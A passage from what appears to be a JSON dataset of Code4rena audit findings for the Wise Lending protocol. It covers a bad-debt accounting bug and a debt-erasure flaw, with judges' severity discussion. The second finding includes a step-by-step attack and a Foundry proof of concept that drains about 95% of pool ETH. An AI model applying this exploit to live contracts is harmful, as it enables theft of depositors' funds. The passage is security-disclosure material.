POSITION_NFTS_INSTANCE.mintPosition();\n\n        LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);\n\n        vm.stopPrank();\n\n        // borrower supplies collateral token and borrows ETH\n        vm.startPrank(borrower);\n\n        MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);\n\n        nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();\n        \n        LENDING_INSTANCE.solelyDeposit( // supply collateral\n            nftIdLiquidatee, \n            address(MOCK_ERC20_2), \n            depositAmountToken\n        );\n\n        debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH\n\n        vm.stopPrank();\n    }\n\n    function _marketCrashCreatesBadDebt() internal {\n        // shortfall event/crash occurs\n        vm.prank(MOCK_DEPLOYER);\n\n        MOCK_CHAINLINK_2.setValue(0.3 ether);\n\n        // borrower gets partially liquidated\n        vm.startPrank(lender);\n\n        MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);\n\n        LENDING_INSTANCE.liquidatePartiallyFromTokens(\n            nftIdLiquidatee,\n            nftIdLiquidator, \n            address(MOCK_WETH),\n            address(MOCK_ERC20_2),\n            debtShares * 2e16 / 1e18 + 1 \n        );\n\n        vm.stopPrank();\n\n        // global and user bad debt is increased\n        uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();\n        uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);\n\n        assertGt(totalBadDebt, 0); \n        assertGt(userBadDebt, 0);\n        assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same\n    }\n\n    function _tryToPayBackGlobalDebt() internal returns (uint256 paybackShares) {\n        // lender attempts to pay back global debt\n        paybackShares = LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH));\n        uint256 paybackAmount = LENDING_INSTANCE.paybackAmount(address(MOCK_WETH), paybackShares);\n\n        vm.startPrank(lender);\n\n        MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), paybackAmount);\n        \n        FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(\n            nftIdLiquidatee, \n            address(MOCK_WETH), \n            paybackShares\n        );\n\n        vm.stopPrank();\n\n        // global bad debt and user bad debt updated\n        uint256 finalTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();\n        uint256 finalUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);\n\n        assertEq(finalUserBadDebt, 0); // user has no more bad debt, all paid off\n        assertGt(finalTotalBadDebt, 0); // protocol still thinks there is bad debt\n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nI would recommend updating `totalBadDebtETH` with the `difference` of the previous and new bad debt of a position in the `WiseSecurity::checkBadDebtLiquidation` function, similar to how it is done in the `FeeManagerHelper::_updateUserBadDebt` internal function.\n\nExample implementation:\n\n```diff\ndiff --git a/./WiseSecurity/WiseSecurity.sol b/./WiseSecurity/WiseSecurity.sol\nindex d2cfb24..75a34e8 100644\n--- a/./WiseSecurity/WiseSecurity.sol\n+++ b/./WiseSecurity/WiseSecurity.sol\n@@ -424,14 +424,22 @@ contract WiseSecurity is WiseSecurityHelper, ApprovalHelper {\n             uint256 diff = totalBorrow\n                 - bareCollateral;\n\n-            FEE_MANAGER.increaseTotalBadDebtLiquidation(\n-                diff\n-            );\n+            uint256 currentBadDebt = FEE_MANAGER.badDebtPosition(_nftId);\n\n             FEE_MANAGER.setBadDebtUserLiquidation(\n                 _nftId,\n                 diff\n             );\n+\n+            if (diff > currentBadDebt) {\n+                FEE_MANAGER.increaseTotalBadDebtLiquidation(\n+                    diff - currentBadDebt\n+                );\n+            } else {\n+                FEE_MANAGER.decreaseTotalBadDebtLiquidation(\n+                    currentBadDebt - diff\n+                );\n+            }\n         }\n     }\n```\n\n**[Trust (judge) increased severity to High](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74#issuecomment-2021274755)**\n\n**[vonMangoldt (Wise Lending) commented via duplicate issue #243](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/243#issuecomment-2009558588):**\n> This doesn't lead to loss of user funds though. Hence, it should be downgraded since one could just migrate and redeploy after discovering that. Otherwise good find.\n\n**[Foon256 (Wise Lending) commented via duplicate issue #243](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/243#issuecomment-2009622123):**\n> Would agree with that! This is a good insight, but users' funds are never at risk. This is related to the `feeManager` and the fees taken from the protocol. Therefore, a Medium issue.\n\n**[Alex the Entreprenerd (Appellate Court judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74#issuecomment-2056796083):**\n > ### Summary of the issue\n >\n> When a market accrues bad debt, which can be inflated due to an accounting error, fees and incentives will no longer be distributed.\n> *Note: The discussion had quite a bit of back and forth, for this reason the whole conversation is pasted below:*\n> \n> ### Discussion\n>\n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> This seems to be tied to a specific interpretation of this discussion we've had around loss of yield as high.\n> \n> **hickuphh3 (judge 2) commented:**\n> Fees would be considered as matured yield? Given that it extends beyond the protocol to beneficials and incentive owners, I'm leaning towards a high more than a medium.\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> Yes it would be considered matured. I don't have an opinion on this report yet and will follow up later today with my notes.\n>\n>Not fully made up my mind but here's a couple of points:\n> \n> For Medium: Loss of Yield -> There is no loss of principal so Med seems fine.\n> \n> For High: The contract is not losing yield in some case, the contract is losing 100% of all yield. The contract is no longer serving it's purpose.\n> \n> External Conditions: Bad debt must be formed. Bad debt handling is part of the system design, so assuming this can happen is fair, and starting from a scenario in which this can happen is also fair.\n> \n> That said, in reality, this may never happen.\n> \n> My main point for downgrading is that while the contract is losing all of the yield, nothing beside that is impacted, not fully sure on this one.\n> \n> **LSDan (judge 3) commented:**\n> I'm aligned with high on this one. Even though the conditions that lead to it are rare and there are arguably external conditions in some scenarios, there is a direct loss of funds and the functional loss of a contract's purpose. Once this situation occurs, there is no clean way back from it.\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> I think this is the issue where we will have some contention. I think the Sponsor interpretation is important to keep in mind as it's pretty rational. I would like to think about it a bit more.\n> \n>**Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> I'm leaning towards Med on this report, I think the Sponsors POV is valid.\n> \n> There is an accounting error, it would not cause permanent loss of funds. It would be mitigated by deprecating the market and creating a new one.\n> \n> My main argument is that if this was live, this would trigger a re-deploy but it would not trigger any white hat rescue operation, as funds would be safe.\n> \n> **hickuphh3 (judge 2) commented**:\n> [#74](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74): When we stick to the c4a rules to which we agreed, all the loss of fees are no user funds and therefore, should be treated differently.\n> \n> The core argument for Medium severity is that fees are a secondary concern.\n> \n> This goes against the supreme court decision where fees shouldn't be treated as 2nd class citizens [here](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization#loss-of-fees-as-low).\n> \n> Loss of fees should be regarded as an impact similar to any other loss of capital. Loss of real amounts depends on specific conditions and likelihood considerations.\n> \n> Likelihood: Requirement of bad debt formation. Once there is, funds (fees) are permanently bricked. \n> \n> There is an accounting error, it would not cause permanent loss of funds; it would be mitigated by deprecating the market and creating a new one.\n> \n> The funds you are referring to are user funds? Separately, I don't see how it would mitigate the bricking once it happens.\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> I don't think that the ruling means that loss of fees should be treated as high at all times.\n> \n> The main argument is that the broken accounting doesn't create a state that is not recoverable:\n> - Some fees are lost.\n> - User deprecates market (raises interests or pauses).\n> - Deployes new Market.\n> - System resumes functioning as intended.\n> \n> My main argument is that this would not cause a War Room, it would cause a deprecation that the system can handle.\n> \n> **hickuphh3 (judge 2) commented:**\n> In what cases/scenarios would loss of fees be high then? Most, if not all, won't have a war room for protocol fees.\n> \n> The reason I would consider to justify downgrading is the low likelihood of the external requirement of bad debt formation `+` `>=` 2 partial liquidations.\n> \n> I would dissent and argue for high severity. \n> - Permanent loss of unclaimed fees.\n> - Blast radius: affects not just the protocol, but incentive owners and beneficiaries.\n>\n>Had the fees gone only to the protocol, I'd lean a bit more towards Medium.\n> \n> Is `WiseLending` immutable in a `poolToken` instance? \n> \n> What contracts would have to be re-deployed?\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> Liquidation premium being denied could be a valid High loss of yield, loss of gas for refunds when the system entire goal is that (e.g. keepers, voting on Nouns).\n> \n> ### Alex the Entreprenerd's (Appellate Court lead judge) Input\n>\n> The finding shows how in the specific case of liquidations with bad debt, a market will stop accounting for fees.\n> \n> 2 aggravating circumstances seem to be:\n> - Inability to pause and replace each market.\n> - The Math for bad debt is also wrong, leading to the inability to fix the bug.\n> \n> This would still cause a loss of fees for a certain period of time, as the admin would eventually be able to set the market fees to either a state that would cause users to stop using it or `0` as a means to stop the loss.\n> \n> I think that the accounting mistake is notable, and I understand the reasoning for raising severity.\n> \n> That said, because we have to judge by impact of the finding, I believe Medium Severity to be most appropriate.\n> \n> ### hickuphh3's (judge 2) Input\n>\n> I maintain my stance for High severity for the reasons I stated above:\n> - Permanent loss of unclaimed fees.\n> - Impact on protocol ecosystem: beneficiaries and incentive owners.\n> \n> ### LSDan’s (judge 3) Input\n>\n> I'm still of the opinion that High is most appropriate here. The impact is significant enough that raising the severity beyond medium makes sense.\n> \n> ### Deliberation\n>\n> The severity is kept at High Severity, with a non-unanimous verdict.\n> \n> ### Additional Context by the Lead Judge\n> \n> I recommend monitoring how this decision influences future decisions on severities, especially when it comes to a percentage loss of yield, an attacker having the button to cause a loss of yield, against this instance which is the permanent inability for the contract to record a gain of yield. \n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74#issuecomment-2082898865):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `WiseLending` contract where fees collected from the contract are not being properly distributed to `incentive owners` if there is any global bad debt. The severity of this issue was initially debated, with some judges arguing for a high severity due to the potential loss of fees and impact on the protocol ecosystem, while others argued for a medium severity due to the ability to mitigate the issue by deprecating and redeploying the market. Ultimately, the severity was decided to be high due to the permanent loss of fees and functional loss of the contract's purpose. The issue has since been mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74",
      "tags": [],
      "finders": [
        "0xStalin",
        "serial-coder",
        "JCN",
        "Draiakoo"
      ]
    },
    {
      "id": "32086",
      "title": "[H-02] User can erase their position debt for free",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L816-L866>\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L667-L727>\n\n### Vulnerability details\n\nWhen the pool token stops being used in the position, the `_removePositionData` function is called. However, it assumes that `poolToken` that is passed as a parameter always exists in user token array, which is not always the case. In the case of function `FeeManager.paybackBadDebtNoReward()`, which indirectly calls `_removePositionData`, insufficient validation doesn't check if repay token is in user array, which results in zeroing out information about user debt.\n\n### Impact\n\nFree elimination of user debt.\n\n### Proof of Concept\n\nFirst, let's see how `MainHelper._removePositionData()` works:\n\n```javascript\n    function _removePositionData(\n        uint256 _nftId,\n        address _poolToken,\n        function(uint256) view returns (uint256) _getPositionTokenLength,\n        function(uint256, uint256) view returns (address) _getPositionTokenByIndex,\n        function(uint256, address) internal _deleteLastPositionData,\n        bool isLending\n    )\n        private\n    {\n        uint256 length = _getPositionTokenLength(\n            _nftId\n        );\n\n        if (length == 1) {\n            _deleteLastPositionData(\n                _nftId,\n                _poolToken\n            );\n\n            return;\n        }\n\n        uint8 i;\n        uint256 endPosition = length - 1;\n\n        while (i < length) {\n\n            if (i == endPosition) {\n                _deleteLastPositionData(\n                    _nftId,\n                    _poolToken\n                );\n\n                break;\n            }\n\n            if (_getPositionTokenByIndex(_nftId, i) != _poolToken) {\n                unchecked {\n                    ++i;\n                }\n                continue;\n            }\n\n            address poolToken = _getPositionTokenByIndex(\n                _nftId,\n                endPosition\n            );\n\n            isLending == true\n                ? positionLendTokenData[_nftId][i] = poolToken\n                : positionBorrowTokenData[_nftId][i] = poolToken;\n\n            _deleteLastPositionData(\n                _nftId,\n                _poolToken\n            );\n\n            break;\n        }\n    }\n```\n\nSo, `_poolToken` sent in parameter is not checked if:\n\n1. The position consists of only one token. Then the token is removed, no matter if it's `_poolToken` or not.\n2. No token was found during the position token iteration. In which case, the last token is removed, no matter if it's `_poolToken` or not.\n\nThis function is called in `MainHelper._corePayback()`, which in turn is called in `FeeManager.paybackBadDebtNoReward() => WiseLending.corePaybackFeeManager() => WiseLending._handlePayback()`. The important factor is that `paybackBadDebtNoReward()` doesn't check if position utilizes  `_paybackToken` passed by the caller and allows it to pass any token. The only prerequisite is that `badDebtPosition[_nftId]` has to be bigger than `0`:\n\n```javascript\n    function paybackBadDebtNoReward(\n        uint256 _nftId,\n        address _paybackToken,\n        uint256 _shares\n    )\n        external\n        returns (uint256 paybackAmount)\n    {\n        updatePositionCurrentBadDebt(\n            _nftId\n        );\n\n        if (badDebtPosition[_nftId] == 0) {\n            return 0;\n        }\n\n        if (WISE_LENDING.getTotalDepositShares(_paybackToken) == 0) {\n            revert PoolNotActive();\n        }\n\n        paybackAmount = WISE_LENDING.paybackAmount(\n            _paybackToken,\n            _shares\n        );\n\n        WISE_LENDING.corePaybackFeeManager(\n            _paybackToken,\n            _nftId,\n            paybackAmount,\n            _shares\n        );\n\n        _updateUserBadDebt(\n            _nftId\n        );\n\t\t// [...]\n```\n\nWith these pieces of information, we can form following attack path:\n\n1. Prepare a big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.\n2. Prepare a very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done, for example, before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.\n3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.\n4. Because there is non-zero bad debt, the check will pass, and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, the diminishing position size in USDC token will not underflow and position token will be tried to be removed:\n\n```javascript\n    function _corePayback(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount,\n        uint256 _shares\n    )\n        internal\n    {\n        _updatePoolStorage(\n            _poolToken,\n            _amount,\n            _shares,\n            _increaseTotalPool,\n            _decreasePseudoTotalBorrowAmount,\n            _decreaseTotalBorrowShares\n        );\n\n        _decreasePositionMappingValue(\n            userBorrowShares,\n            _nftId,\n            _poolToken,\n            _shares\n        );\n\n        if (userBorrowShares[_nftId][_poolToken] > 0) {\n            return;\n        }\n\n        _removePositionData({\n            _nftId: _nftId,\n            _poolToken: _poolToken,\n            _getPositionTokenLength: getPositionBorrowTokenLength,\n            _getPositionTokenByIndex: getPositionBorrowTokenByIndex,\n            _deleteLastPositionData: _deleteLastPositionBorrowData,\n            isLending: false\n        });\n```\n\n5. Inside `_removePositionData`, because position length is 1, no checks to confirm if the token address matches will be performed:\n\n```javascript\n        uint256 length = _getPositionTokenLength(\n            _nftId\n        );\n\n        if (length == 1) {\n            _deleteLastPositionData(\n                _nftId,\n                _poolToken\n            );\n\n            return;\n        }\n```\n\n6. This means that all information about user borrows are deleted. Meaning, that now system thinks the user has `$1M` collateral, and no debt. Which means that the attacker just stole the entire borrowed amount.\n\n### Recommended Mitigation Steps\n\nAdd verification if the token that is passed to `_removePositionData()` exists in user tokens. If not, revert the transaction.\n\n### Assessed type\n\nInvalid Validation\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270):**\n > Double checking line of reasoning fails when user deposits large amount and then borrows.\n> \n>> 1. Prepare big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.\n>> 2. Prepare very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done for example before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.\n>> 3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.\n>> 4. Because there is non-zero bad debt, the check will pass, and and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, diminishing position size in USDC token will not underflow, and position token will be tried to be removed:\n> \n> Comment:\n> 1. Ok say big position has `nftId` = 1.\n> 2. Ok say small position has `nftId` = 2.\n>\n> `nftId` 2 now takes more collateral and borrows max:\n> then calls `paybackBadDebtNoReward` with `nftId` 2.\n> \n> But since collateral has been deposited and borrowed within non liquidation range (healthstate check active remember),\n>\n> This line here:\n>\n> ```\n> updatePositionCurrentBadDebt(\n>             _nftId\n>         );\n> ```\n>\n> in the beginning will set `badDebtPosition[_nft]` to `0` meaning it will exit after this line:\n>\n> ```\n> if (badDebtPosition[_nftId] == 0) {\n>     return 0;\n>  }\n>  ```\n> \n> and no harm done.\n\n\n**[deliriusz (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2026861525):**\n > @Trust - I have provided the coded PoC below. It shows that user is able to steal whole protocol funds, due to wrong algorithm in `_removePositionData()`. I managed to not use very big position and a single token, which makes this issue even easier to perform.\n> \n> PoC provided below does the following:\n> 1. Setup initial state - 2 lenders depositing 100 ETH each, and 1 borrower whose position will have bad debt. For the purpose of this test I chose market crash condition; however, using a small position that will give no incentives to liquidate it will also work.\n> 2. Position is underwater and is liquidated in order to increase bad debt for user position. This is a prerequisite for being able to trigger bad debt repayment.\n> 3. When bad debt repayment is triggered for a token that user didn't use, `_removePositionData()` removes last token in user borrow tokens. In this case that means that the user doesn't have any tokens in his debt tokens listed.\n> 4. User borrows 95% of ALL ETH that the protocol holds. It's possible, because when performing health check at the end of borrow, all user borrow tokens are iterated through - and remember that we just removed the token.\n> 5. At the end I verified that the user really got the funds, which proves that the issue is real.\n>\n><details>\n> \n> ```javascript\n> // SPDX-License-Identifier: -- WISE --\n> \n> pragma solidity =0.8.24;\n> \n> import \"./WiseLendingBaseDeployment.t.sol\";\n> \n> contract DebtClearTest is BaseDeploymentTest {\n>     address borrower = address(uint160(uint(keccak256(\"alice\"))));\n>     address lender = address(uint160(uint(keccak256(\"bob\"))));\n>     address lender2 = address(uint160(uint(keccak256(\"bob2\"))));\n> \n>     uint256 depositAmountETH = 100 ether; // 10 ether\n>     uint256 depositAmountToken = 10 ether; // 10 ether\n>     uint256 borrowAmount = 5e18; // 5 ether\n> \n>     uint256 nftIdLiquidator; // nftId of lender\n>     uint256 nftIdLiquidatee; // nftId of borrower\n> \n>     uint256 debtShares;\n> \n>     function _setupIndividualTest() internal override {\n>         _deployNewWiseLending(false);\n> \n>         // set token value for simple calculations\n>         MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH\n>         assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());\n>         vm.stopPrank();\n>         \n>         // fund lender and borrower\n>         vm.deal(lender, depositAmountETH);\n>         vm.deal(lender2, depositAmountETH);\n>         deal(address(MOCK_WETH), lender, depositAmountETH);\n>         deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);\n>         deal(address(MOCK_ERC20_1), lender, depositAmountToken * 2);\n>     }\n> \n>     function testRemovingToken() public {\n>         IERC20 WETH = IERC20(LENDING_INSTANCE.WETH_ADDRESS());\n>                 // lender supplies ETH\n>         vm.startPrank(lender);\n> \n>         nftIdLiquidator = POSITION_NFTS_INSTANCE.mintPosition();\n> \n>         // deposit 100 ether into the pool\n>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);\n> \n>         vm.stopPrank();\n> \n>         // prank second provider to make sure that the borrower is able to\n>         // steal everyone's funds later\n>         vm.startPrank(lender2);\n> \n>         uint nftIdfundsProvider = POSITION_NFTS_INSTANCE.mintPosition();\n> \n>         // deposit 100 ether into the pool\n>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdfundsProvider);\n> \n>         vm.stopPrank();\n> \n>         // borrower supplies collateral token and borrows ETH\n>         vm.startPrank(borrower);\n> \n>         MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);\n> \n>         nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();\n>         \n>         vm.warp(\n>             block.timestamp + 10 days\n>         );\n> \n>         LENDING_INSTANCE.depositExactAmount( // supply collateral\n>             nftIdLiquidatee, \n>             address(MOCK_ERC20_2), \n>             10\n>         );\n> \n>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH\n> \n>         vm.stopPrank();\n> \n>         // shortfall event/crash occurs. This is just one of the possibilities of achieving bad debt\n>         // second is maintaining small position that gives no incentive to liquidate it.\n>         vm.prank(MOCK_DEPLOYER);\n>         MOCK_CHAINLINK_2.setValue(0.3 ether);\n> \n>         // borrower gets partially liquidated\n>         vm.startPrank(lender);\n> \n>         MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);\n> \n>         LENDING_INSTANCE.liquidatePartiallyFromTokens(\n>             nftIdLiquidatee,\n>             nftIdLiquidator, \n>             address(MOCK_WETH),\n>             address(MOCK_ERC20_2),\n>             debtShares * 2e16 / 1e18 + 1 \n>         );\n> \n>         vm.stopPrank();\n> \n>         // global and user bad debt is increased\n>         uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();\n>         uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);\n> \n>         assertGt(totalBadDebt, 0); \n>         assertGt(userBadDebt, 0);\n>         assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same\n> \n>         vm.startPrank(lender);\n> \n>         MOCK_ERC20_1.approve(address(LENDING_INSTANCE), type(uint256).max);\n>         MOCK_ERC20_1.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);\n>         MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);\n>         \n>         // check how much tokens the position that will be liquidated has\n>         uint256 lb = LENDING_INSTANCE.getPositionBorrowTokenLength(\n>             nftIdLiquidatee\n>         );\n> \n>         assertEq(lb, 1);\n> \n>         uint256 ethValueBefore = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(MOCK_ERC20_2)\n>         );\n> \n>         console.log(\"ethBefore \", ethValueBefore);\n> \n>         // **IMPORTANT** this is the core of the issue\n>         // When bad debt occurs, there are 2 critical checks missing:\n>         // 1. that the amount to repay is bigger than 0\n>         // 2. that the token to repay bad debt has the bad debt for user\n>         // This allows to remove any token from the list of user borrow tokens,\n>         // because of how finding token to remove algorithm is implemented:\n>         // it iterates over all the tokens and if it doesn't find matching one\n>         // until it reaches last, it wrongly assumes that the last token is the\n>         // one that should be removed.\n>         // And not checking for amount of repayment allows to skip Solidity underflow \n>         // checks on diminishing user bad debt.\n>         FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(\n>             nftIdLiquidatee, \n>             address(MOCK_ERC20_1), // user doesn't have debt in this token\n>             0\n>         );\n> \n>         uint256 ethValueAfter = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(MOCK_ERC20_2)\n>         );\n>         uint256 ethWethValueAfter = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(WETH)\n>         );\n>         console.log(\"ethAfter \", ethValueAfter);\n> \n>         // assert that the paybackBadDebtNoReward removed token that it shouldn't\n>         uint256 la = LENDING_INSTANCE.getPositionBorrowTokenLength(\n>             nftIdLiquidatee\n>         );\n>         assertEq(la, 0);\n> \n>         vm.stopPrank();\n>         \n>         uint lendingWethBalance = WETH.balanceOf(address(LENDING_INSTANCE));\n> \n>         console.log(\"lb \", lendingWethBalance);\n>         console.log(\"bb \", borrower.balance);\n> \n>         vm.startPrank(borrower);\n> \n>         // borrow 95% of ALL ETH that the protocol possesses\n>         // this works, because when calculating health check of a position\n>         // it iterates through `getPositionBorrowTokenLength()` - and we\n>         // were able to remove it.\n>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, WETH.balanceOf(address(LENDING_INSTANCE)) * 95 / 100); // borrow ETH\n> \n>         console.log(\"lb \", WETH.balanceOf(address(LENDING_INSTANCE)));\n>         console.log(\"ba \", borrower.balance);\n> \n>         // make sure that borrow tokens were not increased\n>         uint256 la2 = LENDING_INSTANCE.getPositionBorrowTokenLength(\n>             nftIdLiquidatee\n>         );\n>         assertEq(la2, 0);\n> \n>         // verify that ~95% were taken from the pool and borrower received them\n>         assertLt(WETH.balanceOf(address(LENDING_INSTANCE)), lendingWethBalance * 6 / 100);\n>         assertGt(borrower.balance, lendingWethBalance * 94 / 100);\n> \n>         uint256 ethValueAfter2 = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(MOCK_ERC20_2)\n>         );\n>         console.log(\"ethAfter2 \", ethValueAfter2);\n>         vm.stopPrank();\n> \n>         // borrowing doesn't increase user borrow\n>         assertEq(ethValueAfter, ethValueAfter2);\n>     }\n> }\n> ```\n> \n> </details>\n>\n> At the end of the test, it's verified that user is in possession of ~95% of the ETH that was initially deposited to the pool.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027095241):**\n > Confirmed the test passes. \n >\n> ```\n> [PASS] testRemovingToken() (gas: 2242360)\n> Logs:\n>   ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0x6D93d20285c95BbfA3555c00f5206CDc1D78a239\n>   POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0x1b5a405a4B1852aA6F7F65628562Ab9af7e2e2e9\n>   LATEST RESPONSE 1000000000000000000\n>   ethBefore  300000000000000000\n>   ethAfter  300000000000000000\n>   lb  195100000000000000001\n>   bb  5000000000000000000\n>   lb  9755000000000000001\n>   ba  190345000000000000000\n>   ethAfter2  300000000000000000\n> ```\n> \n> The likelihood/impact are in line with high severity.\n> A POC was not initially provided, but the step by step given is deemed sufficient.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027309902):**\n > @Foon256 or @vonMangoldt - can check this again I think. I'll check what kind of code change we need to add in order to prevent this scenario.\n\n**[Foon256 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2029781697):**\n > The POC is correct but different from the previous presented attack, which was not possible as @vonMangoldt has shown. I don't know about the rules in this case, because the POC has been submitted long after the deadline and is a different attack than submitted before.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2030208760):**\n > The warden's identification of the root cause is correct and the severity is correct. If there were different submissions this would have gotten a 50%, but for solo finds there is no mechanism for partial scoring.\n\n**[Alex the Entreprenerd (Appellate Court lead judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2056792265):**\n > ### Summary of the issue\n >\n> Due to an incorrect logic, it is possible for a user to have all of their debt forgiven by repaying another bad debt position with a non-existing token.\n> \n> ### Alex the Entreprenerd’s (Appellate Court lead judge) input\n>\n> Facts:\n> 1. `paybackBadDebtNoReward` can be called with non existent `paybacktoken`.\n> 2. First `poolToken` bad debt position will be deleted by default.\n> 3. Remove position in the original submission is not fully clear, but is implicitly mentioning using `_deleteLastPositionBorrowDatafor` `_removePositionData`.\n> 4. This will forgive the bad debt and break the system.\n> 5. Was disputed due to this.\n> \n> This asserts that the attack cannot be done atomically, that's true.\n>\n> 6. The original submission explains that, due to generating bad debt.\n> \n> I believe that the finding has shown a way for bad debt to be forgiven, and that the race condition around \"proper\" vs \"malicious\" liquidators is not a major decision factor.\n> \n> I would like to add that the original submission is passable but should have done a better job at:\n> - Using only necessary snippets, with comments and tags.\n> - Explain each logical step more simply (A calls B, B is pointer to C, C is doing X).\n> \n> I believe the root cause and the attack was shown in the original submission and as such believe the finding to be valid and high severity.\n>\n> ### hickuphh3's (judge 2) input\n>\n> This issue should’ve been accompanied with a POC, then there would be no disambiguity over its validity and severity.\n> \n> I agree with the judge’s assessment. The warden correctly identified the root cause of lacking input validation of `_poolToken`, which allows `_removePositionData` to incorrectly remove borrowed positions, thus erasing that user’s debt. \n> \n> The severity of this alone is high, as it effectively allows the user to forgo repaying his debt.\n> \n> I disagree with the statement that the POC is different from the previous presented attack. It is roughly the same as the presented step-by-step walkthrough, with amplified impact: the user is able to borrow more tokens for free subsequently, without having to repay.\n> \n> Disregarding the POC that was submitted after the audit, IMO, the line-by-line walkthrough sufficiently proved the issue. \n> \n> ### LSDan’s (judge 3) Input\n> I think this one should be held as invalid due to [this ruling](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-standardization-of-additional-warden-output-during-qa) in Decisions from the inaugural Supreme Court session.\n>\n> As far as I can see, the swaying information was the POC added after the submission deadline. It doesn't matter if the issue was technically correct. The quality was not high enough to lead the judge to mark it as satisfactory without the additional information. @Alex The Entreprenerd thoughts?\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> I don't think the POC added any additional info that was not present in the original submission. Invalid token causes default pop of real 